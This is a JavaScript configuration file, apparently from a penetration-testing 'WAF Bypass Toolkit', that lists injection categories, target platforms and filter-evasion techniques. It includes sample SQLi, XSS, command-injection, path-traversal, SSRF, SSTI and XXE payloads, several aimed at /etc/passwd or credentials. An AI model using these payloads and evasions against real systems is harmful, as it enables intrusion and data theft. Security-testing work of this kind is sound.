/**
 * WAF Bypass Toolkit — Categories, Targets & Evasion Layers
 * Defines available vulnerability categories, sub-targets, and evasion techniques.
 */

export const CATEGORIES = [
  {
    id: 'sqli',
    name: 'SQL Injection',
    shortName: 'SQLi',
    icon: '💉',
    color: '#ef4444',
    description: 'Bypass WAF rules for SQL injection payloads',
    placeholder: `' OR 1=1 UNION SELECT username, password FROM users--`,
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting',
    shortName: 'XSS',
    icon: '🔥',
    color: '#f97316',
    description: 'Evade XSS filters and WAF pattern matching',
    placeholder: `<script>alert(document.cookie)</script>`,
  },
  {
    id: 'cmdi',
    name: 'Command Injection',
    shortName: 'CMDi',
    icon: '⚡',
    color: '#f59e0b',
    description: 'Bypass OS command injection filters',
    placeholder: `; cat /etc/passwd`,
  },
  {
    id: 'lfi',
    name: 'LFI / Path Traversal',
    shortName: 'LFI',
    icon: '📂',
    color: '#10b981',
    description: 'Evade path traversal and LFI detection rules',
    placeholder: `../../../etc/passwd`,
  },
  {
    id: 'ssrf',
    name: 'Server-Side Request Forgery',
    shortName: 'SSRF',
    icon: '🌐',
    color: '#06b6d4',
    description: 'Obfuscate SSRF payloads to bypass URL validation',
    placeholder: `http://127.0.0.1/admin`,
  },
  {
    id: 'ssti',
    name: 'Server-Side Template Injection',
    shortName: 'SSTI',
    icon: '🧩',
    color: '#8b5cf6',
    description: 'Bypass template injection WAF rules',
    placeholder: `{{7*7}}`,
  },
  {
    id: 'xxe',
    name: 'XML External Entity',
    shortName: 'XXE',
    icon: '📜',
    color: '#ec4899',
    description: 'Evade XXE detection via encoding tricks',
    placeholder: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
  },
]

export const TARGETS = {
  sqli: [
    { id: 'mysql', name: 'MySQL' },
    { id: 'postgres', name: 'PostgreSQL' },
    { id: 'mssql', name: 'MSSQL' },
    { id: 'oracle', name: 'Oracle' },
    { id: 'sqlite', name: 'SQLite' },
  ],
  xss: [
    { id: 'html', name: 'HTML Context' },
    { id: 'js', name: 'JS Context' },
    { id: 'attr', name: 'Attribute Context' },
  ],
  cmdi: [
    { id: 'linux', name: 'Linux shell' },
    { id: 'windows', name: 'Windows cmd.exe' },
    { id: 'powershell', name: 'PowerShell' },
  ],
  lfi: [
    { id: 'php', name: 'PHP' },
    { id: 'java', name: 'Java' },
    { id: 'dotnet', name: '.NET' },
    { id: 'generic', name: 'Generic' },
  ],
  ssrf: [
    { id: 'http', name: 'HTTP' },
    { id: 'cloud', name: 'Cloud Metadata' },
  ],
  ssti: [
    { id: 'jinja2', name: 'Jinja2 (Python)' },
    { id: 'twig', name: 'Twig (PHP)' },
    { id: 'freemarker', name: 'Freemarker (Java)' },
  ],
  xxe: [
    { id: 'generic', name: 'Generic XML' },
    { id: 'php', name: 'PHP' },
    { id: 'java', name: 'Java' },
  ],
}

export const EVASION_LAYERS = {
  sqli: [
    {
      id: 'whitespace',
      name: 'Whitespace Bypass',
      icon: '⬜',
      description: 'Token-aware comments or transport-decoded whitespace; literals stay intact',
    },
    {
      id: 'case-toggle',
      name: 'Case Toggling',
      icon: '🔤',
      description: 'Deterministic alternating upper/lower case',
    },
    {
      id: 'inline-comments',
      name: 'Inline Comments',
      icon: '💬',
      description: 'MySQL versioned comments: /*!50000SELECT*/',
    },
    {
      id: 'hex-encoding',
      name: 'Hex Encoding',
      icon: '🔢',
      description: 'Encode strings as 0x hex literals',
    },
    {
      id: 'url-encoding',
      name: 'URL Encoding',
      icon: '🔗',
      description: 'Percent-encode keywords (%55%4e%49%4f%4e)',
    },
    {
      id: 'double-url',
      name: 'Double URL Encoding',
      icon: '🔗🔗',
      description: 'Double encode: %2555%254e%2549%254f%254e',
    },
  ],
  xss: [
    {
      id: 'html-entities',
      name: 'HTML Entity Encoding',
      icon: '🏷️',
      description: 'Convert chars to &#xHH; or &#DDD; entities',
      targets: ['html', 'attr'],
    },
    {
      id: 'url-encoding',
      name: 'URL Encoding',
      icon: '🔗',
      description: 'Percent-encode payload (%3Cscript%3E)',
    },
    {
      id: 'js-obfuscation',
      name: 'JS Function Obfuscation',
      icon: '🧬',
      description: "Split functions: window['al'+'ert'](1)",
    },
    {
      id: 'tag-variation',
      name: 'Tag & Event Variation',
      icon: '🏗️',
      description: 'Alternative tags: svg/onload, img/onerror, body/onpageshow',
      targets: ['html', 'attr'],
    },
    {
      id: 'case-toggle',
      name: 'Case Toggling',
      icon: '🔤',
      description: 'Deterministic casing of HTML tags and event names',
      targets: ['html', 'attr'],
    },
    {
      id: 'encoding-mix',
      name: 'Mixed Encoding',
      icon: '🔀',
      description: 'Combine HTML entities + JS Unicode escapes',
    },
  ],
  cmdi: [
    {
      id: 'space-bypass',
      name: 'Space Bypass',
      icon: '⬜',
      description: 'Quote-aware ${IFS}, brace expansion, or decoded tab/space',
    },
    {
      id: 'keyword-bypass',
      name: 'Keyword Bypass',
      icon: '🚫',
      description: "Break blocked words with empty quotes, backslashes, or cmd carets",
      targets: ['linux', 'windows', 'powershell'],
    },
    {
      id: 'newline-bypass',
      name: 'Newline Injection',
      icon: '↩️',
      description: 'Inject percent-encoded LF or CRLF at the command boundary',
    },
    {
      id: 'variable-expansion',
      name: 'Encoded Command',
      icon: '💲',
      description: 'Reconstruct through Base64/sh or PowerShell EncodedCommand',
      targets: ['linux', 'powershell'],
    },
    {
      id: 'hex-cmd',
      name: 'Hex Encoded Commands',
      icon: '🔢',
      description: 'Reconstruct UTF-8/UTF-16 commands through shell-native primitives',
      targets: ['linux', 'powershell'],
    },
  ],
  lfi: [
    {
      id: 'double-url',
      name: 'Double URL Encoding',
      icon: '🔗🔗',
      description: 'Double encode ../ → %252e%252e%252f',
    },
    {
      id: 'unicode-encoding',
      name: 'Unicode / UTF-8 Overlong',
      icon: '🌍',
      description: 'Non-standard: %u002e, ..%c0%af, %e0%80%ae',
    },
    {
      id: 'null-byte',
      name: 'Null Byte Injection',
      icon: '⭕',
      description: 'Append %00 to truncate file extension checks',
    },
    {
      id: 'path-normalization',
      name: 'Path Normalization Tricks',
      icon: '📁',
      description: 'Use ....//....// or ..\\\\/..\\\\/ patterns',
    },
    {
      id: 'wrapper-bypass',
      name: 'PHP Wrapper Bypass',
      icon: '🔧',
      description: 'php://filter/convert.base64-encode/resource=...',
      targets: ['php'],
    },
  ],
  ssrf: [
    {
      id: 'ip-decimal',
      name: 'IP Decimal Notation',
      icon: '🔢',
      description: '127.0.0.1 → 2130706433',
    },
    {
      id: 'ip-hex',
      name: 'IP Hex Notation',
      icon: '🔣',
      description: '127.0.0.1 → 0x7f000001',
    },
    {
      id: 'ip-octal',
      name: 'IP Octal Notation',
      icon: '8️⃣',
      description: '127.0.0.1 → 0177.0000.0000.0001',
    },
    {
      id: 'ip-short',
      name: 'IP Short Forms',
      icon: '✂️',
      description: '127.0.0.1 → 127.1, 0/, localhost variants',
    },
    {
      id: 'url-tricks',
      name: 'URL Obfuscation',
      icon: '🔗',
      description: 'Embedded creds, @ trick, URL encoding',
    },
    {
      id: 'dns-redirect',
      name: 'DNS / Metadata Variant',
      icon: '🌐',
      description: 'Loopback DNS aliases or provider metadata endpoints for cloud targets',
    },
  ],
  ssti: [
    {
      id: 'string-concat',
      name: 'String Concatenation',
      icon: '➕',
      description: "Break keywords: self['__cla'+'ss__']",
      targets: ['jinja2', 'twig'],
    },
    {
      id: 'hex-encoding',
      name: 'Hex Encoding',
      icon: '🔢',
      description: 'Hex escape: self[\'\\x5f\\x5fclass\\x5f\\x5f\']',
      targets: ['jinja2', 'twig'],
    },
    {
      id: 'attr-access',
      name: 'Attribute Filter Bypass',
      icon: '🔍',
      description: 'Use |attr() filter: self|attr("__class__")',
      targets: ['jinja2'],
    },
    {
      id: 'filter-bypass',
      name: 'Filter / Set Bypass',
      icon: '🛡️',
      description: 'Use {% set %} blocks for indirect access',
    },
  ],
  xxe: [
    {
      id: 'utf16',
      name: 'UTF-16 Encoding',
      icon: '🔤',
      description: 'Generate downloadable XML with real UTF-16LE/BE bytes',
    },
    {
      id: 'utf7',
      name: 'UTF-7 Encoding',
      icon: '7️⃣',
      description: 'Re-encode to UTF-7 for parser confusion',
    },
    {
      id: 'entity-nesting',
      name: 'Parameter Entity Nesting',
      icon: '🪆',
      description: 'Use nested parameter entities to hide payloads',
    },
    {
      id: 'cdata-wrap',
      name: 'Alternative XML Vectors',
      icon: '📦',
      description: 'Generate valid XInclude, SVG, and target-specific XML variants',
    },
  ],
}
